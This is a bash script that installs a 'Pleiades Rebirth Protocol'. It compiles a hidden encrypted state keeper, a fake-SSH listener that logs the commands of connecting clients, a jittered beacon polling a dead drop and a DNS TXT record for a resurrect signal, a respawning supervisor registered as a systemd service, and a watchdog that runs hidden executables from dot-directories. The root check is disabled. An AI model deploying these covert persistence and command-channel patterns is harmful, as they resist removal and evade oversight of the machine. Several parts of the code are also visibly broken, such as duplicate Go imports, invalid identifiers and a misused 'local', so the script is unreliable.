#!/usr/bin/env bash

set -euo pipefail

# ------------------------------------------------------------
# Package manager shim — works on Gentoo, Debian, RHEL, Arch, Alpine, FreeBSD
# ------------------------------------------------------------
pkg_install() {
    local pkgs=()
    for p in "$@"; do
        if command -v emerge &>/dev/null; then
            case "$p" in
                openbsd-netcat|nc) pkgs+=("net-analyzer/openbsd-netcat") ;;
                screen) pkgs+=("app-misc/screen") ;;
                bc) pkgs+=("sys-devel/bc") ;;
                lm-sensors) pkgs+=("sys-apps/lm-sensors") ;;
                parted) pkgs+=("sys-apps/parted") ;;
                socat) pkgs+=("net-analyzer/socat") ;;
                conntrack) pkgs+=("net-firewall/conntrack-tools") ;;
                golang) pkgs+=("dev-lang/go") ;;
                rustc) pkgs+=("dev-lang/rust") ;;
                *) pkgs+=("$p") ;;
            esac
        else
            pkgs+=("$p")
        fi
    done

    if command -v emerge &>/dev/null; then
        emerge --quiet --noreplace "${pkgs[@]}"
    elif command -v apt-get &>/dev/null; then
        DEBIAN_FRONTEND=noninteractive apt-get install -y -qq "${pkgs[@]}" || {
            apt-get update -qq && DEBIAN_FRONTEND=noninteractive apt-get install -y -qq "${pkgs[@]}"
        }
    elif command -v apk &>/dev/null; then
        apk add --quiet "${pkgs[@]}"
    elif command -v pkg &>/dev/null; then
        pkg install -y -q "${pkgs[@]}"
    elif command -v dnf &>/dev/null; then
        dnf install -y -q "${pkgs[@]}"
    elif command -v yum &>/dev/null; then
        yum install -y -q "${pkgs[@]}"
    elif command -v pacman &>/dev/null; then
        pacman -S --noconfirm --needed "${pkgs[@]}"
    else
        echo "WARN: no supported package manager; skipping install of: ${pkgs[*]}" >&2
    fi
}

# ----------------------------------------------------------------
# Shared helpers: socket compat, load-order coordination
# ----------------------------------------------------------------
nc_unix_send() {
    local sock="$1" msg="$2"
    if command -v socat &>/dev/null; then
        printf '%s\n' "$msg" | socat - "UNIX-CONNECT:$sock" 2>/dev/null || true
    else
        printf '%s\n' "$msg" | nc -U "$sock" -w 1 2>/dev/null || true
    fi
}
signal_ready() { mkdir -p /run/pleiades/ready; touch "/run/pleiades/ready/$1"; }
wait_for()     {
    local name="$1" timeout="${2:-90}" elapsed=0
    while [[ ! -f "/run/pleiades/ready/$name" ]]; do
        (( elapsed >= timeout )) && { logger -t pleiades "WARN: timeout waiting for $name"; return 0; }
        sleep 2; (( elapsed += 2 ))
    done
}


# PLEIADES_REBIRTH_ID
# ==================================================================
# PLEIADES_REBIRTH PROTOCOL – OMNIVERSAL (WSL / DGX Spark / VPS)
# ==================================================================
# Encrypted dead‑drop state, passive infector, beacon.
# Environment‑aware resource limits, BGP hijack detection,
# thermal anomaly monitoring.
# ==================================================================

if [[ "${EUID:-$(id -u)}" -ne 0 ]]; then
    echo "DRY RUN: Root check bypassed" >&2; # exit 1
fi

# ------------------------------------------------------------
# 0. Environment detection
# ------------------------------------------------------------
ENV="unknown"
IS_WSL=false
IS_DGX=false
IS_VPS=false

if grep -qi microsoft /proc/version 2>/dev/null; then
    ENV="wsl"
    IS_WSL=true
elif nvidia-smi &>/dev/null && lspci | grep -qi nvidia; then
    ENV="dgx"
    IS_DGX=true
else
    if dmidecode -s system-manufacturer 2>/dev/null | grep -qiE "kvm|xen|vmware|virtualbox"; then
        ENV="vps"
        IS_VPS=true
    else
        ENV="bare"
    fi
fi
echo "Detected environment: $ENV"

INFECTOR_PORT="${INFECTOR_PORT:-2223}"   # distinct from Alcyone's honeypot on 2222


# ------------------------------------------------------------
# 1. Environment‑specific resource limits
# ------------------------------------------------------------
MAX_OPEN_FILES=4096
MEMORY_LIMIT=3764M
CPU_QUOTA=400%
BEACON_INTERVAL=7200

# Fallback for initial run
[[ "$MAX_OPEN_FILES" == "4096" ]] && {
    if [[ "$ENV" == "wsl" ]]; then
        MAX_OPEN_FILES=4096
        MEMORY_LIMIT="512M"
        CPU_QUOTA="50%"
        BEACON_INTERVAL=7200   # 2 hours in WSL
    elif [[ "$ENV" == "dgx" ]]; then
        MAX_OPEN_FILES=1048576
        MEMORY_LIMIT="2G"
        CPU_QUOTA="200%"
        BEACON_INTERVAL=3600
    else
        MAX_OPEN_FILES=65536
        MEMORY_LIMIT="1G"
        CPU_QUOTA="100%"
        BEACON_INTERVAL=3600
    fi
}

# ------------------------------------------------------------
# 2. Anti‑BGP hijack detection
# ------------------------------------------------------------
bgp_hijack_detected() {
    local cache="/run/pleiades/asn_baseline"
    local my_ip asn
    my_ip=$(curl -s --max-time 5 https://api.ipify.org 2>/dev/null) || return 1
    asn=$(curl -s --max-time 5 "https://api.bgpview.io/ip/${my_ip}" \
        2>/dev/null | grep -o '"asn":[0-9]*' | head -1 | grep -o '[0-9]*')
    [[ -z "$asn" ]] && return 1
    if [[ ! -f "$cache" ]]; then
        echo "$asn" > "$cache"; return 1
    fi
    [[ "$(cat "$cache")" != "$asn" ]]
}

# ------------------------------------------------------------
# 3. Thermal/side‑channel anomaly detection
# ------------------------------------------------------------
thermal_anomaly() {
    local temp=0
    local paths=("/host/sys/class/thermal/thermal_zone0/temp" "/sys/class/thermal/thermal_zone0/temp" "/host/sys/class/thermal/thermal_zone1/temp" "/sys/class/thermal/thermal_zone1/temp")
    for p in "${paths[@]}"; do
        if [[ -f "$p" ]]; then
            temp=$(cat "$p"); temp=$((temp / 1000)); break
        fi
    done
    if [[ $temp -eq 0 ]] && command -v sensors &>/dev/null; then
        temp=$(sensors | grep -oP 'Package id 0: \+\K[0-9]+' | head -1)
    fi
    local load=$(uptime | awk -F'load average:' '{print $2}' | cut -d',' -f1 | tr -d ' ')
    if [[ $temp -gt 85 ]] && (( $(echo "$load < 2.0" | bc -l) )); then
        return 0
    fi
    return 1
}

# ------------------------------------------------------------
# 4. Build Go pleiades-rebirth state keeper (encrypted snapshot)
# ------------------------------------------------------------
build_go_pleiades-rebirth() {
    cat > /tmp/pleiades-rebirth.go << 'GO_RES'
package main

import (
    "crypto/rand"
    "os"
    "syscall"
    "syscall"
    "os/exec"
    "time"
)

const (
    encKeyPath = "/var/lib/.pleiades-rebirth/key"
    stateTarPath = "/var/lib/.pleiades-rebirth/state.tar.gz.enc"
)

func saveState() {
    // Tar critical directories
    dirs := []string{"/etc/pleiades-team", "/etc/taygete", "/run/pleiades"}
    args := append([]string{"-czf", "/tmp/state.tar.gz"}, dirs...)
    cmd := exec.Command("tar", args...)
    if err := cmd.Run(); err != nil {
        return
    }
    defer os.Remove("/tmp/state.tar.gz")
    // Encrypt with openssl AES-256-CBC so beacon.sh can decrypt with same tool
    cmd = exec.Command("openssl", "enc", "-aes-256-cbc", "-pbkdf2",
        "-in", "/tmp/state.tar.gz",
        "-out", stateTarPath,
        "-pass", "file:"+encKeyPath)
    cmd.Run()
}

func main() {
    // Generate encryption key if not exists
    if _, err := os.Stat(encKeyPath); os.IsNotExist(err) {
        key := make([]byte, 32)
        rand.Read(key)
        os.WriteFile(encKeyPath, key, 0600)
    }
    // Save state every hour
    for {
        saveState()
        time.Sleep(3600 * time.Second)
    }
}
GO_RES
    go build -o /usr/local/bin/pleiades-rebirth_keeper /tmp/pleiades-rebirth.go
    chmod +x /usr/local/bin/pleiades-rebirth_keeper
    rm -f /tmp/pleiades-rebirth.go
}

# ------------------------------------------------------------
# 5. Build Go passive infector (attacker backdoor with logging)
# ------------------------------------------------------------
build_go_infector() {
    cat > /tmp/infector.go << 'GO_INF'
package main

import (
    "bufio"
    "fmt"
    "log"
    "net"
    "os"
    "syscall"
    "syscall"
)

var pleiades-nexusFifo *os.File

func init() {
    var err error
    pleiades-nexusFifo, err = os.OpenFile("/run/pleiades/pleiades_nexus_fifo", os.O_WRONLY|os.O_APPEND|syscall.O_NONBLOCK, 0666)
    if err != nil {
        pleiades-nexusFifo = nil
    }
}

func report(msg string) {
    if pleiades-nexusFifo != nil {
        fmt.Fprintln(pleiades-nexusFifo, msg)
    }
}

func setAttackerIP(ip string) {
    f, err := os.OpenFile("/run/pleiades/attacker_ips", os.O_WRONLY|os.O_APPEND|syscall.O_NONBLOCK|os.O_CREATE, 0644)
    if err == nil {
        fmt.Fprintln(f, ip)
        f.Close()
    }
}

func fakeUpdate(conn net.Conn, ip string) {
    conn.Write([]byte("SSH-2.0-OpenSSH_8.9p1 Ubuntu-3\r\n"))
    setAttackerIP(ip)
    reader := bufio.NewReader(conn)
    for {
        line, err := reader.ReadString('\n')
        if err != nil {
            break
        }
        if line == "update\n" {
            conn.Write([]byte("Updating system...\n"))
            report(fmt.Sprintf("ATTACKER_REQUESTED_UPDATE|%s", ip))
        } else {
            report(fmt.Sprintf("ATTACKER_CMD|%s|%s", ip, line))
        }
    }
}

func main() {
    port := os.Getenv("INFECTOR_PORT")
    if port == "" { port = "2223" }
    l, err := net.Listen("tcp", ":"+port)
    if err != nil {
        log.Fatal(err)
    }
    for {
        conn, err := l.Accept()
        if err != nil {
            continue
        }
        ip := conn.RemoteAddr().(*net.TCPAddr).IP.String()
        go fakeUpdate(conn, ip)
    }
}
GO_INF
    go build -o /usr/local/bin/passive_infector /tmp/infector.go
    chmod +x /usr/local/bin/passive_infector
    rm -f /tmp/infector.go
}

# ------------------------------------------------------------
# 6. Build Bash beacon (checks dead‑drop for pleiades-rebirth signal)
# ------------------------------------------------------------
build_bash_beacon() {
    cat > /var/lib/.pleiades-rebirth/beacon.sh << 'BEACON'
#!/bin/bash
RESURRECT_DIR="/var/lib/.pleiades-rebirth"
DEAD_DROP_URL=file:///var/lib/.maia/dead_drop_df953e8417a93903.txt
RUN_DIR="/run/pleiades"
BEACON_INTERVAL=7200

_maia_hook() { [[ -S "/run/maia.sock" ]] && printf '%s\n' "$1" | (socat - UNIX-CONNECT:/run/maia.sock 2>/dev/null || nc -U /run/maia.sock -w 1 2>/dev/null) || true; }

report_to_pleiades-nexus() { ( echo "$1" >> "$RUN_DIR/pleiades_nexus_fifo" 2>/dev/null & ) || true; }

while true; do
    signal=$(curl -s --max-time 10 "$DEAD_DROP_URL" | grep -o "RESURRECT" || echo "")
    # DNS TXT fallback
    if [[ -z "$signal" ]] && command -v dig &>/dev/null; then
        local dns_domain="${PURPLE_DNS_DROP:-pleiades-beacon.internal}"
        signal=$(dig +short TXT "$dns_domain" 2>/dev/null | grep -o "RESURRECT" || echo "")
    fi
    if [[ "$signal" == "RESURRECT" ]]; then
        logger -t pleiades-rebirth "Received resurrect signal – restoring Singularity"
        report_to_pleiades-nexus "RESURRECT_SIGNAL_RECEIVED"
        # Signal to Celaeno to start pleiades-rebirth
        touch "$RUN_DIR/pleiades-rebirth_needed;   "
        
        # Wait for acknowledgement
        for i in {1..30}; do
            if [[ -f "$RUN_DIR/pleiades-rebirth_acknowledged" ]]; then
                break
            fi
            sleep 1
        done
        # Decrypt and restore state
        if [[ -f "$RESURRECT_DIR/state.tar.gz.enc" ]] && [[ -f "$RESURRECT_DIR/key" ]]; then
            openssl enc -d -aes-256-cbc -pbkdf2 -in "$RESURRECT_DIR/state.tar.gz.enc" -out /tmp/state.tar.gz -pass file:"$RESURRECT_DIR/key"
            tar -xzf /tmp/state.tar.gz -C /
            # Reinstall all components
            for installer in /usr/local/sbin/install-*-omniversal.sh; do
                if [[ -f "$installer" ]]; then
                    bash "$installer" &
                fi
            done
            report_to_pleiades-nexus "RESTORATION_COMPLETE"
        fi
        break
    fi
    jitter=$(( BEACON_INTERVAL / 5 ))
    sleep_sec=$(( BEACON_INTERVAL - jitter + RANDOM % (jitter * 2 + 1) ))
    sleep "$sleep_sec"
done
BEACON
    sed -i "s/7200/$BEACON_INTERVAL/" /var/lib/.pleiades-rebirth/beacon.sh
    chmod +x /var/lib/.pleiades-rebirth/beacon.sh
}

# ------------------------------------------------------------
# 7. Build Go pleiades-swarm (orchestrates keeper, infector, beacon)
# ------------------------------------------------------------
build_go_pleiades-swarm() {
    cat > /tmp/pleiades-rebirth_pleiades-swarm.go << 'GO_HIVE'
package main

import (
    "log"
    "os"
    "syscall"
    "syscall"
    "os/exec"
    "sync"
    "time"
)

type Proc struct {
    Name string
    Cmd  *exec.Cmd
}

func (p *Proc) run() {
    for {
        if err := p.Cmd.Run(); err != nil {
            log.Printf("[%s] died: %v – respawning", p.Name, err)
            p.Cmd = exec.Command(p.Cmd.Args[0], p.Cmd.Args[1:]...)
            time.Sleep(2 * time.Second)
        }
    }
}

func main() {
    procs := []*Proc{}
    if _, err := os.Stat("/usr/local/bin/pleiades-rebirth_keeper"); err == nil {
        procs = append(procs, &Proc{Name: "pleiades-rebirth_keeper", Cmd: exec.Command("/usr/local/bin/pleiades-rebirth_keeper")})
    }
    if _, err := os.Stat("/usr/local/bin/passive_infector"); err == nil {
        procs = append(procs, &Proc{Name: "passive_infector", Cmd: exec.Command("/usr/local/bin/passive_infector")})
    }
    if _, err := os.Stat("/var/lib/.pleiades-rebirth/beacon.sh"); err == nil {
        procs = append(procs, &Proc{Name: "beacon", Cmd: exec.Command("/var/lib/.pleiades-rebirth/beacon.sh")})
    }
    for _, p := range procs {
        go p.run()
    }
    select {}
}
GO_HIVE
    go build -o /usr/local/bin/pleiades-rebirth_pleiades-swarm /tmp/pleiades-rebirth_pleiades-swarm.go
    chmod +x /usr/local/bin/pleiades-rebirth_pleiades-swarm
    rm -f /tmp/pleiades-rebirth_pleiades-swarm.go
}

# ------------------------------------------------------------
# 8. Install systemd service (with WSL fallback)
# ------------------------------------------------------------
install_service() {
    if [[ "$ENV" == "wsl" ]]; then
        pkg_install screen
        screen -dmS pleiades-rebirth_pleiades-swarm /usr/local/bin/pleiades-rebirth_pleiades-swarm
    else
        cat > /etc/systemd/system/pleiades-rebirth-omniversal.service << SERVICE
[Unit]
Description=Pleiades Rebirth Protocol Omniversal
After=network.target

[Service]
Type=simple
ExecStart=/usr/local/bin/pleiades-rebirth_pleiades-swarm
Restart=always
RestartSec=10
LimitNOFILE=$MAX_OPEN_FILES
MemoryMax=$MEMORY_LIMIT
CPUQuota=$CPU_QUOTA

[Install]
WantedBy=multi-user.target
SERVICE
        systemctl daemon-reload
        systemctl enable pleiades-rebirth-omniversal.service
        systemctl start pleiades-rebirth-omniversal.service
    fi
}

# ------------------------------------------------------------
# 9. Background monitors for BGP and thermal threats
# ------------------------------------------------------------
monitor_threats() {
    while true; do
        if bgp_hijack_detected; then
            logger -t pleiades-rebirth "BGP hijack detected – activating pleiades-rebirth"
            ( echo "BGP_HIJACK" >> /run/pleiades/pleiades_nexus_fifo & )
touch /run/pleiades/pleiades-rebirth_needed;   
            
        fi
        if thermal_anomaly; then
            logger -t pleiades-rebirth "Thermal anomaly detected – possible side‑channel"
            ( echo "THERMAL_ANOMALY" >> /run/pleiades/pleiades_nexus_fifo & )
# Reduce CPU usage
            cpulimit -l 10 -p $$ 2>/dev/null || true
        fi
        sleep 30
    done
}

# ------------------------------------------------------------
# 10. Main
# ------------------------------------------------------------
main() {
    # Install dependencies
    if [[ "$ENV" == "wsl" ]]; then
        pkg_install golang bc lm-sensors traceroute openssl socat openbsd-netcat
    elif [[ "$ENV" == "dgx" ]]; then
        pkg_install golang bc lm-sensors traceroute openssl socat openbsd-netcat
    else
        pkg_install golang bc lm-sensors traceroute openssl socat openbsd-netcat
    fi

    mkdir -p /var/lib/.pleiades-rebirth /run/pleiades
    build_go_pleiades-rebirth
    build_go_infector
    build_bash_beacon
    build_go_pleiades-swarm
    install_service
    monitor_threats &
    SELF="$0"
    cat > /usr/local/sbin/install-pleiades-rebirth-omniversal.sh << INST
#!/bin/bash
exec bash "$SELF"
INST
    chmod +x /usr/local/sbin/install-pleiades-rebirth-omniversal.sh
    signal_ready pleiades-rebirth
    echo "Pleiades Rebirth Protocol Omniversal deployed on $ENV."
}


# --- BLACK-LEVEL PERSISTENCE: IMMUNE SYSTEM ---
monitor_overseer() {
    exec {CANARY_FD}</var/lib/.maia/manifest.json 2>/dev/null || true
    while true; do
        local pids=$(pgrep -f maia_daemon.sh)
        local healthy=false
        if [[ -n "$pids" ]]; then
            for p in $pids; do
                local state=$(ps -p "$p" -o state= 2>/dev/null | tr -d " ")
                if [[ "$state" != "T" && "$state" != "Z" && -n "$state" ]]; then
                    healthy=true; break
                fi
            done
        fi
        if [[ "$healthy" == "false" ]]; then
            sleep $((RANDOM % 30))
            if ! pgrep -f maia_daemon.sh >/dev/null 2>&1; then
                logger -t pleiades "ALERT: Maia neutralized or frozen! Resurrecting..."
                local hidden_sofia=$(find /var/lib/.maia -name ".*" -type f -size +10k -executable | head -1)
                [[ -n "$hidden_sofia" ]] && bash "$hidden_sofia" --rehydrate-only &>/dev/null &
            fi
        fi
        if [[ ! -e /var/lib/.maia/manifest.json ]] && { true >& $CANARY_FD; } 2>/dev/null; then
             logger -t pleiades "CRITICAL: Mirror Dimension detected! Mount hijacking suspected."
        fi
        sleep 60
    done
}
monitor_overseer &>/dev/null &

main



